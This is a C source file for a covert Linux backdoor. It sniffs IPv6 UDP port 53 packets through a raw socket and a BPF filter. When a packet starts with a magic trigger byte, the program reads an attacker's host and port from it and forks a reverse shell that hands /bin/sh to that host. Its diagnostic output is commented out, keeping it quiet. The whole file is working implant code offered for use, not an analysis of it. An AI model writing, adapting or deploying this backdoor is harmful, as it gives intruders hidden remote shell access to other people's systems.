/*
MIT License

Copyright (c) 2022 raj3shp

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/
    
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <arpa/inet.h>
#include <netinet/ip6.h>
#include <net/ethernet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <netdb.h>
#include <linux/if_ether.h>
#include <linux/filter.h>

#define DEFAULT_PORT "65000"

void apply_bpf_filter(int sd);
void reverse_shell(const char *host, const char *port);

int main() {
    int sd, pkt_size;
    char *buf = malloc(65536);
    if (!buf) {
        perror("malloc failed");
        exit(1);
    }

    if ((sd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IPV6))) < 0) {
        perror("error creating socket");
        free(buf);
        exit(1);
    }

    apply_bpf_filter(sd);
    signal(SIGCHLD, SIG_IGN);

//    printf("[*] Listening for IPv6-only UDP port 53 trigger packets...\n");

    while (1) {
        if ((pkt_size = recvfrom(sd, buf, 65536, 0, NULL, NULL)) < 0) {
//            perror("error receiving from socket");
            break;
        }

        size_t offset = sizeof(struct ether_header) + sizeof(struct ip6_hdr) + 8; // 14 + 40 + 8 = 62 bytes
        if (pkt_size <= (int)offset) continue;

        struct ether_header *eth = (struct ether_header *)buf;
        if (ntohs(eth->ether_type) != ETH_P_IPV6) continue;

        char *data = buf + offset;
        size_t data_len = pkt_size - offset;

        // Check for magic byte 'X' (0x58)
       // if (data[0] == 0x53) {
if (data[0] == 0x21) {

            size_t i = 1, h_idx = 0, p_idx = 0;
            char host[64]; // Fits full IPv6 address + interface zone ID (e.g., fe80::1%eth0)
            char port[8];

            // 1. Extract IPv6 host until '|' (0x7C)
            while (i < data_len && data[i] != 0x7C && h_idx < sizeof(host) - 1) {
                host[h_idx++] = data[i++];
            }
            host[h_idx] = '\0';

            // 2. Skip '|' and extract port if present
            if (i < data_len && data[i] == 0x7C) {
                i++;
                while (i < data_len && data[i] != 0x7C && data[i] != '\0' && data[i] != '\n' && p_idx < sizeof(port) - 1) {
                    port[p_idx++] = data[i++];
                }
            }
            port[p_idx] = '\0';

            const char *target_port = (p_idx > 0) ? port : DEFAULT_PORT;
  //          printf("[+] IPv6 Triggered! Host: '%s' | Port: '%s'\n", host, target_port);

            pid_t pid = fork();
            if (pid == 0) {
                close(sd);
                free(buf);
                reverse_shell(host, target_port);
                exit(0);
            }
        }
    }

    free(buf);
    close(sd);
    return 0;
}

void apply_bpf_filter(int sd) {
    // tcpdump ip6 and udp and dst port 53 -dd
    struct sock_filter filter[] = {
        { 0x28, 0, 0, 0x0000000c }, // Load EtherType at offset 12
        { 0x15, 0, 5, 0x000086dd }, // Check ETH_P_IPV6 (0x86dd)
        { 0x30, 0, 0, 0x00000014 }, // Load Next Header at offset 20 (14 + 6)
        { 0x15, 0, 3, 0x00000011 }, // Check IPPROTO_UDP (17 / 0x11)
        { 0x28, 0, 0, 0x00000038 }, // Load UDP dst port at offset 56 (14 + 40 + 2)
        { 0x15, 0, 1, 0x00000035 }, // Check port 53 (0x35)
        { 0x6, 0, 0, 0x00040000 },  // Accept packet
        { 0x6, 0, 0, 0x00000000 },  // Drop packet
    };
    size_t filter_size = sizeof(filter) / sizeof(struct sock_filter);
    struct sock_fprog bpf = {
        .len = filter_size,
        .filter = filter,
    };

    if ((setsockopt(sd, SOL_SOCKET, SO_ATTACH_FILTER, &bpf, sizeof(bpf))) < 0) {
        perror("Error attaching BPF filter");
        exit(1);
    }
}

void reverse_shell(const char *host, const char *port) {
    struct addrinfo hints, *res, *p;
    int sd;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET6;      // IPv6 only
    hints.ai_socktype = SOCK_STREAM; // TCP

    int err = getaddrinfo(host, port, &hints, &res);
    if (err != 0) {
    //    fprintf(stderr, "[-] getaddrinfo failed for '[%s]:%s': %s\n", host, port, gai_strerror(err));
        return;
    }

    for (p = res; p != NULL; p = p->ai_next) {
        sd = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
        if (sd < 0) continue;

        if (connect(sd, p->ai_addr, p->ai_addrlen) == 0) {
  //          printf("[+] Connected to [%s]:%s\n", host, port);
            break;
        }
      //  perror("[-] connect failed");
        close(sd);
    }

    freeaddrinfo(res);
    if (p == NULL) return;

    dup2(sd, 0);
    dup2(sd, 1);
    dup2(sd, 2);

    char *argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);
}
